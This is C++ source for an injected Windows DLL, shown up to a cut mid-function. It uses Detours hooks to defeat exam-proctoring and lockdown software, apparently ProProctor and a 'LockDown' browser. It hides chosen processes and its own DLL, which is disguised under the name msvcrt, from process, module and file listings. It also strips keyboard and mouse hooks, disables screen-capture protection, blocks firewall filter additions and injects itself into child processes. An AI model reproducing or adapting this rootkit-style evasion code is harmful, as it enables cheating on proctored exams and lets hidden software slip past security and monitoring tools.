#define WIN32_LEAN_AND_MEAN 

#include <windows.h>
#include <stdio.h>
#include <string>
#include <stdlib.h>
#include <winuser.h>
#include <Shlwapi.h>
#include <string>
#include <winternl.h>
#include <tchar.h>
#include <strsafe.h>
#include "detours.h"
#include <fstream>
#include <vector>
#include <psapi.h>
#include <TlHelp32.h>
#include "ws2tcpip.h"
#include <netfw.h>
#include <comdef.h>
#include "fwpmu.h"
#include <wintrust.h>
#include <softpub.h>
#include "DebugInfo.h"

constexpr const char* DllNameX86 = "msvcrt32.dll";
constexpr const char* DllNameX64 = "msvcrt64.dll";

HHOOK gKeyboardHook = NULL;
HHOOK gMouseHook = NULL;
HHOOK gCALLWNDPROC = NULL;
HHOOK gCBT = NULL;

#pragma comment(lib,"shlwapi.lib")

using namespace std;

DWORD WINAPI WorkThreadFunc();

typedef NTSTATUS(NTAPI* NTQUERYSYSTEMINFORMATION)(
    SYSTEM_INFORMATION_CLASS systemInformationClass, 
    LPVOID systemInformation, 
    ULONG systemInformationLength, 
    PULONG returnLength);

typedef BOOL(NTAPI* SETWINDOWDISPLAYAFFINITY)(
    HWND  hWnd,
    DWORD dwAffinity);

typedef BOOL(NTAPI* GETWINDOWDISPLAYAFFINITY)(
    HWND hWnd,
    DWORD* pdwAffinity);

typedef BOOL(WINAPI* PFindNextFileExW)(HANDLE, FINDEX_INFO_LEVELS, LPVOID, FINDEX_SEARCH_OPS, LPVOID, DWORD);
PFindNextFileExW OriginalFindNextFileExW = NULL;

typedef BOOL(NTAPI* PTerminateProcess)(HANDLE hProcess, UINT uExitCode);

typedef HHOOK(NTAPI* PSetWindowsHookExA)(
    int       idHook,
    HOOKPROC  lpfn,
    HINSTANCE hmod,
    DWORD     dwThreadId
    );
typedef HHOOK(NTAPI* PSetWindowsHookExW)(
    int       idHook,
    HOOKPROC  lpfn,
    HINSTANCE hmod,
    DWORD     dwThreadId
    );
typedef BOOL(WINAPI* PProcess32Next)(
    HANDLE hSnapshot,
    LPPROCESSENTRY32 lppe
    );
typedef INT(WINAPI* PGetNameInfoW)(
    const SOCKADDR* pSockaddr,
    socklen_t      SockaddrLength,
    PWCHAR         pNodeBuffer,
    DWORD          NodeBufferSize,
    PWCHAR         pServiceBuffer,
    DWORD          ServiceBufferSize,
    INT            Flags
    );
BOOL WINAPI MyProcess32Next(
    HANDLE hSnapshot,
    LPPROCESSENTRY32 lppe
);

INT WINAPI MyGetNameInfoW(
	const SOCKADDR* pSockaddr,
	socklen_t      SockaddrLength,
	PWCHAR         pNodeBuffer,
	DWORD          NodeBufferSize,
	PWCHAR         pServiceBuffer,
	DWORD          ServiceBufferSize,
	INT            Flags
);

PProcess32Next pRealProcess32Next = NULL;
PGetNameInfoW OriginalGetNameInfoW = NULL;
typedef BOOL(NTAPI* PFindNextFileA)(
    HANDLE             hFindFile,
    LPWIN32_FIND_DATAA lpFindFileData
    );
typedef BOOL(WINAPI* PProcess32NextW)(
    HANDLE hSnapshot,
    LPPROCESSENTRY32W lppe
    );
BOOL WINAPI MyProcess32NextW(
    HANDLE hSnapshot,
    LPPROCESSENTRY32W lppe
);
typedef BOOL (NTAPI* PSetWindowPos)(
    HWND hWnd,
    HWND hWndInsertAfter,
    int  X,
    int  Y,
    int  cx,
    int  cy,
    UINT uFlags
);

typedef DWORD (NTAPI* PFwpmFilterAdd0)(
         HANDLE               engineHandle,
            const FWPM_FILTER0* filter,
    PSECURITY_DESCRIPTOR sd,
    UINT64* id
);
PSetWindowPos pRealSetWindowPos = NULL;
PProcess32NextW pRealProcess32NextW = NULL;
PFindNextFileA OriginalFindNextFileA = NULL;
NTQUERYSYSTEMINFORMATION OriginalNtQuerySystemInformation = NULL;
PSetWindowsHookExA OriginalSetWindowsHookExA = NULL;
PSetWindowsHookExW OriginalSetWindowsHookExW = NULL;
SETWINDOWDISPLAYAFFINITY OriginalSetWindowDisplayAffinity = NULL;
GETWINDOWDISPLAYAFFINITY OriginalGetWindowDisplayAffinity = NULL;
PTerminateProcess OriginalTerminateProcess = NULL;
PFwpmFilterAdd0 OriginalFwpmFilterAdd0 = NULL;
// Typedef for the NtCreateFile function pointer
typedef NTSTATUS(NTAPI* pNtCreateFile)(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength
    );

// Pointer to the original NtCreateFile function
pNtCreateFile OriginalNtCreateFile = nullptr;

NTSTATUS NTAPI HookedNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS systemInformationClass, 
    LPVOID systemInformation, 
    ULONG systemInformationLength, 
    PULONG returnLength);

BOOL NTAPI HookedSetWindowDisplayAffinity(
    HWND  hWnd,
    DWORD dwAffinity);

BOOL NTAPI HookedGetWindowDisplayAffinity(
    HWND  hWnd,
    DWORD* pdwAffinity);

typedef HDESK(NTAPI* CREATEDESKTOPW)(
    LPCWSTR               lpszDesktop,
    LPCWSTR               lpszDevice,
    DEVMODEW* pDevmode,
    DWORD                 dwFlags,
    ACCESS_MASK           dwDesiredAccess,
    LPSECURITY_ATTRIBUTES lpsa
    );


typedef HWINSTA (NTAPI* PCreateWindowStationW)(
    LPCWSTR               lpwinsta,
    DWORD                 dwFlags,
            ACCESS_MASK           dwDesiredAccess,
    LPSECURITY_ATTRIBUTES lpsa
);

typedef BOOL(WINAPI* PQUERYFULLPROCESSIMAGENAMEA)(HANDLE, DWORD, LPSTR, PDWORD);
PQUERYFULLPROCESSIMAGENAMEA g_pQueryFullProcessImageNameA = NULL;


typedef BOOL(WINAPI* PQUERYFULLPROCESSIMAGENAMEW)(HANDLE, DWORD, LPWSTR, PDWORD);
PQUERYFULLPROCESSIMAGENAMEW g_pQueryFullProcessImageNameW = NULL;

typedef BSTR(WINAPI* SysAllocStringType)(const OLECHAR* psz);
SysAllocStringType OriginalSysAllocString = nullptr;
CREATEDESKTOPW OriginalCreateDesktopW = NULL;
PCreateWindowStationW OriginalCreateWindowStationW = NULL;

typedef BOOL(WINAPI* PEnumProcessModules)(HANDLE, HMODULE*, DWORD, LPDWORD);
PEnumProcessModules OriginalEnumProcessModules = NULL;

void WriteLog(char* str)
{
    char szTemp[MAX_PATH] = { 0 };
    GetWindowsDirectoryA(szTemp, sizeof(szTemp));
    strcat(szTemp, "\\Temp\\xxxxxxxxxxxxxxxxxxxxxxxxxxxx.log");
 
    CHAR szDLLFile[MAX_PATH] = { 0 };
    CHAR szDLLName[MAX_PATH] = { 0 };

    time_t current_time;
    char formatted_time[80];
    struct tm* time_info;

    time(&current_time);
    time_info = localtime(&current_time);
    strftime(formatted_time, 80, "%Y-%m-%d %H:%M:%S ", time_info);

    ofstream outfile;
    outfile.open(szTemp, ios::app);
    outfile << formatted_time << str << endl;
    outfile.close();
}
void WriteLog(int str)
{
    char szTemp[MAX_PATH] = { 0 };
    GetWindowsDirectoryA(szTemp, sizeof(szTemp));
    strcat(szTemp, "\\Temp\\xxxxxxxxxxxxxxxxxxxxxxxxxxxx.log");
    ofstream outfile;
    outfile.open(szTemp, ios::app);
    outfile << str << endl;
    outfile.close();
}
WCHAR HiddenProcess[][MAX_PATH]{
    L"svchost.exe",
    L"zerotier_desktop_ui.exe",
    L"zerotier-one_x64.exe",
    L"zerotier",
    L"rdpclip.exe",
    L"rdpclip",
    L"csrss.exe",
    L"csrss",
    L"MpUpdate.exe",
    L"MpUpdate",
    L"mpsvc"
};

typedef LONG(WINAPI* WinVerifyTrustType)(HWND hwnd, GUID* pgActionID, LPVOID pWVTData);

WinVerifyTrustType OriginalWinVerifyTrust = nullptr;

wchar_t* charToWchar(const char* mbString) {
    if (mbString == nullptr) {
        return nullptr; // Handle null pointer input
    }

    // Calculate the required buffer size
    int bufferSize = mbstowcs(nullptr, mbString, 0);
    if (bufferSize == -1) {
        // Error handling
        return nullptr;
    }

    // Allocate memory for the wchar_t* buffer
    wchar_t* wideBuffer = new wchar_t[bufferSize + 1];

    // Perform the conversion
    mbstowcs(wideBuffer, mbString, bufferSize);
    wideBuffer[bufferSize] = L'\0';

    return wideBuffer;
}
bool IsHiddenProcess(UNICODE_STRING name) {
    if (name.Length == 0)
        return false;

    for (int i = 0; i < sizeof(HiddenProcess) / sizeof(HiddenProcess[0]); i++) {
        if (_wcsnicmp(name.Buffer, HiddenProcess[i], name.Length) == 0)
            return true;
    }
    return false;
}
bool IsHiddenProcess(char* aname) {
    wchar_t* name = charToWchar(aname);

    for (int i = 0; i < sizeof(HiddenProcess) / sizeof(HiddenProcess[0]); i++) {
        if (_wcsnicmp(HiddenProcess[i], name, wcslen(HiddenProcess[i])) == 0)
        {
            return true;
        }
    }

    for (int i = 0; i < sizeof(HiddenProcess) / sizeof(HiddenProcess[0]); i++) {
        if (wcsstr(name, HiddenProcess[i]) != NULL)
        {
            return true;
        }
    }

    return false;
}
BOOL WINAPI HookedFindNextFileExW(HANDLE hFindFile, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags) {
    BOOL result;

    // Call the original FindNextFileExW until we get a file that doesn't match the hidden file name
    do {
        result = OriginalFindNextFileExW(hFindFile, fInfoLevelId, lpFindFileData, fSearchOp, lpSearchFilter, dwAdditionalFlags);
        if (result == FALSE) {
            return FALSE;  // No more files
        }

        // Check if file name matches the one we want to hide
        if (fInfoLevelId == FindExInfoStandard) {
            WIN32_FIND_DATAW* pFileData = (WIN32_FIND_DATAW*)lpFindFileData;
            if (wcsnicmp(pFileData->cFileName, L"msvcrt", 6) == 0) {
                DbgPrintfW(L"HookedFindNextFileExW %s", pFileData->cFileName);
                continue;  // Skip this file
            }
        }
    } while (wcsnicmp(((WIN32_FIND_DATAW*)lpFindFileData)->cFileName, L"msvcrt", 6) == 0);

    return TRUE;
}
BOOL WINAPI Hooked_EnumProcessModules(HANDLE hProcess, HMODULE* lphModule, DWORD cb, LPDWORD lpcbNeeded) {
    // Call the real EnumProcessModules
    BOOL result = OriginalEnumProcessModules(hProcess, lphModule, cb, lpcbNeeded);

    if (!result) return FALSE;

    if (cb == 0)
        return result;
    // Filter out specific DLL by name or module handle
    int moduleCount = *lpcbNeeded / sizeof(HMODULE);
    int j = 0;
    for (int i = 0; i < moduleCount; i++) {
        TCHAR moduleName[MAX_PATH];
        if (GetModuleFileNameEx(hProcess, lphModule[i], moduleName, MAX_PATH)) {
            // Check for DLL name you want to hide, e.g., "target.dll"
            if (_tcsstr(moduleName, TEXT("msvcrt"))) {
                DbgPrintfA("XXXXXXXXXXXXX_%s", moduleName);
                lphModule[j++] = lphModule[i];
            }
        }
    }
    *lpcbNeeded = j * sizeof(HMODULE);
    return TRUE;
}
NTSTATUS NTAPI HookedNtCreateFile(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength
) {
    // Log the file path if available
    if (ObjectAttributes && ObjectAttributes->ObjectName) {
        if (ObjectAttributes->ObjectName->Buffer && wcsstr(ObjectAttributes->ObjectName->Buffer, L"msvcrt"))
         OutputDebugStringW( ObjectAttributes->ObjectName->Buffer);
        //return 0xC0000022;
    }

    // Call the original NtCreateFile function
    return OriginalNtCreateFile(
        FileHandle,
        DesiredAccess,
        ObjectAttributes,
        IoStatusBlock,
        AllocationSize,
        FileAttributes,
        ShareAccess,
        CreateDisposition,
        CreateOptions,
        EaBuffer,
        EaLength
    );
}
bool IsHiddenProcess(WCHAR* name) {
    for (int i = 0; i < sizeof(HiddenProcess) / sizeof(HiddenProcess[0]); i++) {
        if (_wcsnicmp(HiddenProcess[i], name, wcslen(HiddenProcess[i])) == 0)
        {
            return true;
        }
    }

    for (int i = 0; i < sizeof(HiddenProcess) / sizeof(HiddenProcess[0]); i++) {
        if (wcsstr(name, HiddenProcess[i]) != NULL)
        {
            return true;
        }
    }

    return false;
}
BSTR WINAPI HookedSysAllocString(const OLECHAR* psz) {
    //WriteLog("hooked sysalloc");
    //WriteLog((wchar_t*)psz);

    if (psz && wcscmp(psz, L"root\\cimv2") == 0)
    {
        return OriginalSysAllocString(L"root");
    }

    return OriginalSysAllocString(psz);
}
LONG WINAPI MyWinVerifyTrust(HWND hwnd, GUID* pgActionID, LPVOID pWVTData)
{
    OutputDebugStringW(L"MyWinVerifyTrust");

    // 检查是否是文件验证请求
    if (pWVTData)
    {
        WINTRUST_DATA* winTrustData = reinterpret_cast<WINTRUST_DATA*>(pWVTData);
        DbgPrintfA("MyWinVerifyTrust_%d", winTrustData->dwUIChoice);
        // 确保是文件验证
        if (winTrustData->dwUnionChoice == WTD_CHOICE_FILE)
        {
            WINTRUST_FILE_INFO* fileInfo = winTrustData->pFile;

            if (fileInfo && fileInfo->pcwszFilePath)
            {
                std::wstring filePath = fileInfo->pcwszFilePath;
                DbgPrintfW(L"MyWinVerifyTrust_%s", fileInfo->pcwszFilePath);
             
                // 检查文件名是否匹配
                //if (filePath.find(targetFileName) != std::wstring::npos)
                //{
                //    std::wcout << L"Hooked WinVerifyTrust for file: " << filePath << std::endl;
                //    return ERROR_SUCCESS;  // 强制返回成功，绕过签名验证
                //}
            }
        }
        else if (winTrustData->dwUnionChoice == WTD_CHOICE_CATALOG) {
            WINTRUST_CATALOG_INFO* fileInfo = winTrustData->pCatalog;

            if (fileInfo && fileInfo->pcwszCatalogFilePath)
            {
                std::wstring filePath = fileInfo->pcwszCatalogFilePath;
                DbgPrintfW(L"MyWinVerifyTrust 11_%s", fileInfo->pcwszCatalogFilePath);

                // 检查文件名是否匹配
                //if (filePath.find(targetFileName) != std::wstring::npos)
                //{
                //    std::wcout << L"Hooked WinVerifyTrust for file: " << filePath << std::endl;
                //    return ERROR_SUCCESS;  // 强制返回成功，绕过签名验证
                //}
            }
        }
    }
    //return ERROR_SUCCESS;
    // 如果文件名不匹配，调用原始的 WinVerifyTrust
    return OriginalWinVerifyTrust(hwnd, pgActionID, pWVTData);
}
BOOL WINAPI MyQueryFullProcessImageNameA(HANDLE hProcess, DWORD dwFlags, LPSTR lpExeName, PDWORD lpdwSize)
{
    BOOL result;
    result = g_pQueryFullProcessImageNameA(hProcess, dwFlags, lpExeName, lpdwSize);
    if (IsHiddenProcess(lpExeName))
    {
        SetLastError(ERROR_ACCESS_DENIED);
        return 0;
    }

    return result;
}
BOOL WINAPI MyQueryFullProcessImageNameW(HANDLE hProcess, DWORD dwFlags, LPWSTR lpExeName, PDWORD lpdwSize)
{
    BOOL result;

    result = g_pQueryFullProcessImageNameW(hProcess, dwFlags, lpExeName, lpdwSize);


    if (IsHiddenProcess(lpExeName))
    {
        SetLastError(ERROR_ACCESS_DENIED);
        return 0;
    }

    return result;
}
BOOL isProProctor()
{
    char szPath[MAX_PATH] = { 0 };

    GetModuleFileNameA(NULL, szPath, sizeof(szPath));
    LPCSTR lpFileName = PathFindFileNameA(szPath);

    if (lpFileName && _stricmp(lpFileName, "ProProctor.exe") == 0)
        return TRUE;

    return FALSE;
}
BOOL CheckAntiEnabled()
{
    return TRUE;

    if (isProProctor())
        return TRUE;

    HANDLE hMutex = CreateMutex(NULL, FALSE, "Global\\ENABLE_SCREEN_PROTECT");
    DWORD dret = GetLastError();

    if (hMutex) {
        CloseHandle(hMutex);
    }
    if (dret == ERROR_ALREADY_EXISTS) {
        return TRUE;
    }
    WriteLog("NOT enabled");
    return FALSE;
}
void setDAForWindows() {
    char szBuff[100] = { 0 };
    GetModuleFileNameA(NULL, szBuff, 100);

    DbgPrintfA("Ininject process_%s", szBuff);

    vector<HWND> vecHnds;
    while (true) {

        if (CheckAntiEnabled()) {

            if (gKeyboardHook) {
                UnhookWindowsHookEx(gKeyboardHook);
                WriteLog("remove WH_KEYBOARD_LL");
                //DbgPrintf("Unhooked WH_KEYBOARD_LL:%d", gKeyboardHook);
                gKeyboardHook = NULL;
            }
            if (gMouseHook) {
                UnhookWindowsHookEx(gMouseHook);
                WriteLog("remove WH_KEYBOARD_LL");
                //DbgPrintf("Unhooked WH_MOUSE_LL:%d", gMouseHook);
                gMouseHook = NULL;
            }
            if (gCALLWNDPROC) {
                UnhookWindowsHookEx(gCALLWNDPROC);
                WriteLog("remove WH_CALLWNDPROC");
                //DbgPrintf("Unhooked WH_MOUSE_LL:%d", gMouseHook);
                gCALLWNDPROC = NULL;
            }
            if (gCBT) {
                UnhookWindowsHookEx(gCBT);
                WriteLog("remove gCBT");
                //DbgPrintf("Unhooked WH_MOUSE_LL:%d", gMouseHook);
                gCBT = NULL;
            }
            DWORD dwPid = GetCurrentProcessId();

            HWND windowHandle = NULL;
            do {
                windowHandle = FindWindowEx(NULL, windowHandle, NULL, NULL);

                DWORD dwWindowPid = 0;
                GetWindowThreadProcessId(windowHandle, &dwWindowPid);

                if (dwPid != dwWindowPid)
                    continue;

                DWORD dwAffinity = 0;

                bool bRet = OriginalGetWindowDisplayAffinity(windowHandle, &dwAffinity);
                if (bRet && dwAffinity != WDA_NONE) {
                    WriteLog("NOT WDA_NONE");

                    if (OriginalSetWindowDisplayAffinity) {
                        OriginalSetWindowDisplayAffinity(windowHandle, WDA_NONE);
                        vecHnds.push_back(windowHandle);
                        WriteLog("SET TO WDA_NONE");
                    }
                }
            } while (windowHandle);
        }
        else {
            for(auto item: vecHnds)
                OriginalSetWindowDisplayAffinity(item, WDA_MONITOR);

            WriteLog("NOT Enabled");
            vecHnds.clear();
        }
        Sleep(1000);
    }
}
void HookFunctions();
BOOL APIENTRY DllMain(HANDLE hMoudle, DWORD dwReason, LPVOID lpReserved)
{
    if (DetourIsHelperProcess()) {
        return TRUE;
    }
    switch(dwReason)
    {
    case DLL_PROCESS_ATTACH:
        HookFunctions();
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThreadFunc, NULL, 0, 0);   
        break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:

        break;
    }
    return TRUE;
}
HHOOK NTAPI HookedSetWindowsHookExA(
    int       idHook,
    HOOKPROC  lpfn,
    HINSTANCE hmod,
    DWORD     dwThreadId
)
{
    WriteLog("HookedSetWindowsHookExA");
    WriteLog(idHook);
    if (idHook == WH_KEYBOARD_LL) {
        gKeyboardHook = OriginalSetWindowsHookExA(idHook, lpfn, hmod, dwThreadId);
        //DbgPrintf("WH_KEYBOARD_LL:%d", gMouseHook);
         WriteLog("WH_KEYBOARD_LL");
        //bMainProcess = true;
        return gKeyboardHook;
    }
    else if (idHook == WH_MOUSE_LL) {
        gMouseHook = OriginalSetWindowsHookExA(idHook, lpfn, hmod, dwThreadId);
        WriteLog("WH_MOUSE_LL");
        WriteLog((int)gMouseHook);
        //DbgPrintf("WH_MOUSE_LL:%d", gMouseHook);
        //bMainProcess = true;
        return gMouseHook;
    }
    else if (idHook == WH_CBT) {
        gCBT = OriginalSetWindowsHookExW(idHook, lpfn, hmod, dwThreadId);
        WriteLog("WH_CBT");
        WriteLog((int)gCBT);
        //DbgPrintf("WH_MOUSE_LL:%d", gMouseHook);
        //bMainProcess = true;
        return gCBT;
    }
    else
        return OriginalSetWindowsHookExA(idHook, lpfn, hmod, dwThreadId);
}
HHOOK NTAPI HookedSetWindowsHookExW(
    int       idHook,
    HOOKPROC  lpfn,
    HINSTANCE hmod,
    DWORD     dwThreadId
)
{
    WriteLog("HookedSetWindowsHookExW");
    WriteLog(idHook);
    if (idHook == WH_KEYBOARD_LL) {
        gKeyboardHook = OriginalSetWindowsHookExW(idHook, lpfn, hmod, dwThreadId);
        //DbgPrintf("WH_KEYBOARD_LL:%d", gMouseHook);
        WriteLog("WH_KEYBOARD_LL");
        //bMainProcess = true;
        return gKeyboardHook;
    }
    else if (idHook == WH_MOUSE_LL) {
        gMouseHook = OriginalSetWindowsHookExW(idHook, lpfn, hmod, dwThreadId);
        WriteLog("WH_MOUSE_LL");
        WriteLog((int)gMouseHook);
        //DbgPrintf("WH_MOUSE_LL:%d", gMouseHook);
        //bMainProcess = true;
        return gMouseHook;
    }
    else if (idHook == WH_CALLWNDPROC) {
        gCALLWNDPROC = OriginalSetWindowsHookExW(idHook, lpfn, hmod, dwThreadId);
        WriteLog("WH_CALLWNDPROC");
        WriteLog((int)gCALLWNDPROC);
        //DbgPrintf("WH_MOUSE_LL:%d", gMouseHook);
        //bMainProcess = true;
        return gCALLWNDPROC;
    }
    else if (idHook == WH_CBT) {
        gCBT = OriginalSetWindowsHookExW(idHook, lpfn, hmod, dwThreadId);
        WriteLog("WH_CBT");
        WriteLog((int)gCBT);
        //DbgPrintf("WH_MOUSE_LL:%d", gMouseHook);
        //bMainProcess = true;
        return gCBT;
    }
    else
        return OriginalSetWindowsHookExA(idHook, lpfn, hmod, dwThreadId);
}
HWINSTA NTAPI HookedCreateWindowStationW(
    LPCWSTR               lpwinsta,
    DWORD                 dwFlags,
    ACCESS_MASK           dwDesiredAccess,
    LPSECURITY_ATTRIBUTES lpsa
)
{
    WriteLog("HookedCreateWindowStationW");
    return OriginalCreateWindowStationW(lpwinsta, dwFlags, dwDesiredAccess, NULL);
}
HDESK NTAPI HookedCreateDesktopW(
    LPCWSTR               lpszDesktop,
    LPCWSTR               lpszDevice,
    DEVMODEW* pDevmode,
    DWORD                 dwFlags,
    ACCESS_MASK           dwDesiredAccess,
    LPSECURITY_ATTRIBUTES lpsa
) {
    WriteLog("CreateDesktopW");
    return OriginalCreateDesktopW(lpszDesktop, lpszDevice, pDevmode, dwFlags, dwDesiredAccess, NULL);
}
DWORD NTAPI HookedFwpmFilterAdd0(
            HANDLE               engineHandle,
            const FWPM_FILTER0* filter,
     PSECURITY_DESCRIPTOR sd,
    UINT64* id
)
{
    WriteLog("HookedFwpmFilterAdd0");
    return ERROR_SUCCESS;
}
BOOL NTAPI HookedSetWindowPos(
    HWND hWnd,
    HWND hWndInsertAfter,
    int  X,
    int  Y,
    int  cx,
    int  cy,
    UINT uFlags
)
{
    OutputDebugStringA("HookedSetWindowPos");
    return pRealSetWindowPos(hWnd, HWND_NOTOPMOST, X, Y, 100, 100, uFlags);
}
BOOL NTAPI HookedTerminateProcess(HANDLE hProcess, UINT uExitCode)
{
    WriteLog("HookedTerminateProcess");
    return OriginalTerminateProcess(hProcess, uExitCode);
}
void InstallHook(LPCSTR dll, LPCSTR function, LPVOID* originalFunction, LPVOID hookedFunction)
{
	HMODULE module = GetModuleHandleA(dll);

    if (module == NULL) {
        module = LoadLibraryA(dll);
    }
    if (module == NULL) {
        OutputDebugStringA(function);
    }

    *originalFunction = (LPVOID)GetProcAddress(module, function);

    if (*originalFunction) {
        DetourAttach(originalFunction, hookedFunction);
    }
		
}
typedef BOOL(WINAPI* CREATEPROCESSW)(IN LPCWSTR lpApplicationName,
    IN LPWSTR lpCommandLine,
    IN LPSECURITY_ATTRIBUTES lpProcessAttributes,
    IN LPSECURITY_ATTRIBUTES lpThreadAttributes,
    IN BOOL bInheritHandles,
    IN DWORD dwCreationFlags,
    IN LPVOID lpEnvironment,
    IN LPCWSTR lpCurrentDirectory,
    IN LPSTARTUPINFOW lpStartupInfo,
    OUT LPPROCESS_INFORMATION lpProcessInformation
    );

typedef BOOL(WINAPI* PCreateProcessAsUserW)(
         HANDLE                hToken,
       LPCWSTR               lpApplicationName,
     LPWSTR                lpCommandLine,
      LPSECURITY_ATTRIBUTES lpProcessAttributes,
        LPSECURITY_ATTRIBUTES lpThreadAttributes,
                   BOOL                  bInheritHandles,
                DWORD                 dwCreationFlags,
        LPVOID                lpEnvironment,
          LPCWSTR               lpCurrentDirectory,
                   LPSTARTUPINFOW        lpStartupInfo,
                LPPROCESS_INFORMATION lpProcessInformation
);
typedef BOOL(WINAPI* CREATEPROCESSA)(
    LPCSTR                lpApplicationName,
    LPSTR                 lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL                  bInheritHandles,
    DWORD                 dwCreationFlags,
    LPVOID                lpEnvironment,
    LPCSTR                lpCurrentDirectory,
    LPSTARTUPINFOA        lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
    );

typedef BOOL(WINAPI* PDETOUR_CREATE_PROCESS_INTERNAL_ROUTINEW)
(
    HANDLE hToken,
    LPCWSTR lpApplicationName,
    LPWSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation);


typedef BOOL(WINAPI* PCreateProcessAsUserA)(
      HANDLE                hToken,
      LPCSTR                lpApplicationName,
    LPSTR                 lpCommandLine,
       LPSECURITY_ATTRIBUTES lpProcessAttributes,
      LPSECURITY_ATTRIBUTES lpThreadAttributes,
                 BOOL                  bInheritHandles,
                 DWORD                 dwCreationFlags,
         LPVOID                lpEnvironment,
       LPCSTR                lpCurrentDirectory,
               LPSTARTUPINFOA        lpStartupInfo,
               LPPROCESS_INFORMATION lpProcessInformation
);

PDETOUR_CREATE_PROCESS_INTERNAL_ROUTINEW OriginalCreateProcessInternal = NULL;
CREATEPROCESSW OriginalCreateProcessW = NULL;
CREATEPROCESSA OriginalCreateProcessA = NULL;
PCreateProcessAsUserA OriginalCreateProcessAsUserA = NULL;
PCreateProcessAsUserW OriginalCreateProcessAsUserW = NULL;

BOOL WINAPI HookedFindNextFileA(
    HANDLE             hFindFile,
    LPWIN32_FIND_DATAA lpFindFileData
)
{
    BOOL bRet = OriginalFindNextFileA(hFindFile, lpFindFileData);

    if (bRet) {
        if (strnicmp(lpFindFileData->cFileName, "msvcrt", 6) == 0) {
            DbgPrintf("FindNextFileA:%s", lpFindFileData->cFileName);
            bRet = OriginalFindNextFileA(hFindFile, lpFindFileData);
        }
    }
    return bRet;
}
BOOL HookedCreateProcessAsUserW(
    HANDLE                hToken,
    LPCWSTR               lpApplicationName,
    LPWSTR                lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL                  bInheritHandles,
    DWORD                 dwCreationFlags,
    LPVOID                lpEnvironment,
    LPCWSTR               lpCurrentDirectory,
    LPSTARTUPINFOW        lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
)
{
    if ((lpApplicationName && wcsstr(lpApplicationName, L"LockDown"))
        || (lpCommandLine && wcsstr(lpCommandLine, L"LockDown"))
        ) {
        DbgPrintfA("DetourCreateProcessInternalWithDllW");

        return DetourCreateProcessInternalWithDllW(
            hToken,
            lpApplicationName,
            lpCommandLine,
            lpProcessAttributes,
            lpThreadAttributes,
            bInheritHandles,
            dwCreationFlags,
            lpEnvironment,
            lpCurrentDirectory,
            lpStartupInfo,
            lpProcessInformation,
#ifdef _WIN64
            DllNameX64,
#else
            DllNameX86,
#endif
            OriginalCreateProcessAsUserW
        );
    }
    else {
        return OriginalCreateProcessAsUserW(
            hToken,
            lpApplicationName,
            lpCommandLine,
            lpProcessAttributes,
            lpThreadAttributes,
            bInheritHandles,
            dwCreationFlags,
            lpEnvironment,
            lpCurrentDirectory,
            lpStartupInfo,
            lpProcessInformation
            );
    }
}

BOOL WINAPI HookedCreateProcessW(LPCWSTR lpApplicationName,
    LPWSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation)
{
    //WriteLog("HookedCreateProcessW");
    return DetourCreateProcessWithDllExW(lpApplicationName,
        lpCommandLine,
        lpProcessAttributes,
        lpThreadAttributes,
        bInheritHandles,
        dwCreationFlags,
        lpEnvironment,
        lpCurrentDirectory,
        lpStartupInfo,
        lpProcessInformation,
#ifdef _WIN64
        DllNameX64,
#else
        DllNameX86,
#endif
        OriginalCreateProcessW
    );
}
BOOL WINAPI HookedCreateProcessAsUserA(
    HANDLE                hToken,
    LPCSTR                lpApplicationName,
    LPSTR                 lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL                  bInheritHandles,
    DWORD                 dwCreationFlags,
    LPVOID                lpEnvironment,
    LPCSTR                lpCurrentDirectory,
    LPSTARTUPINFOA        lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
)
{
    WriteLog("HookedCreateProcessAsUserA");
    return OriginalCreateProcessAsUserA(
        hToken,
        lpApplicationName,
        lpCommandLine,
        lpProcessAttributes,
        lpThreadAttributes,
        bInheritHandles,
        dwCreationFlags,
        lpEnvironment,
        lpCurrentDirectory,
        lpStartupInfo,
        lpProcessInformation
    );
}
BOOL WINAPI HookedCreateProcessInternalW(IN HANDLE  hToken,
    IN LPCWSTR lpApplicationName,
    IN LPWSTR lpCommandLine,
    IN LPSECURITY_ATTRIBUTES lpProcessAttributes,
    IN LPSECURITY_ATTRIBUTES lpThreadAttributes,
    IN BOOL bInheritHandles,
    IN DWORD dwCreationFlags,
